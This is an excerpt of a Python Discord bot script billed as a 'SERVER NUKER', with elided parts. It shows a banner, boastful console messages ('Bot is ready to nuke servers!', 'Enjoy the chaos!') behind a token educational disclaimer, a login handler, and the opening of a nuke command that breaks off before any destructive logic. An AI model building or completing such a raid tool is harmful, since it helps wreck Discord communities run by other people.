...
# ব্যবহার শুরু
loading_effect("Initializing SERVER NUKER", 6)
banner("SERVER NUKER", font="starwars")
print(Fore.RED + "Developed by </> MAHDI !")
slow_print(Fore.LIGHTGREEN_EX + "[+] Server Nuker Loaded Successfully!")
slow_print(Fore.YELLOW + "[+] Welcome to the Nuker Terminal....")
slow_print(Fore.RED + "[+] WARNING: This tool is for educational purposes only. Use responsibly!")
slow_print(Fore.MAGENTA + "[+] Starting the bot...") 
slow_print(Fore.CYAN + "[+] Bot is ready to nuke servers!")
slow_print(Fore.LIGHTYELLOW_EX + "[+] Enjoy the chaos! Remember, with great power comes great responsibility!")
slow_print(Fore.LIGHTCYAN_EX + "[+] Press Ctrl+C to stop the bot at any time.")
slow_print(Fore.LIGHTMAGENTA_EX + "[+] Let's get started! ")
...
@bot.event
async def on_ready():
    print(f">>>>>>>BOT LOGIN DONE<<<<<<< {bot.user} ({bot.user.id})")
...
async def nuke(ctx):
    ...
    icon_url = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZDlleDkyOG1jeTVkdXZmNnlkdWJldGlsNnNmcTlhenBtaWNzb2thOSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/klA9hcyvuOdDzS7SrN/giphy.gif"
    try:
